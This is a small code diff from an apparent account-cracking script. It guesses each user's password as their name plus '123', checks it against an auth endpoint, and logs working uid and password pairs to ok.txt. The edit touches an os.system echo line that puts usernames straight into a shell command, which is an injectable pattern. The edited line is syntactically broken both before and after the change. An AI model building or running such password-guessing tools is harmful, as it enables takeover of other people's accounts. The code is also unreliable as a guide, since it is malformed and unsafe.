@@ -343,13 +343,13 @@ def b_menu_select():
 	
 	def main(arg):
 		user=arg
-		uid,name=user.split("|")
+		uid,name=user.split('|')
 		try:
 		    pass1=name+"123"
 		    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-		        os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass1+' | '+name"| lolcat')
+		        os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass1+' | '+name)"| lolcat')
 		        ok=open("ok.txt","a")
 		        ok.write(uid+" | "+pass1+"\n")
 		        ok.close()
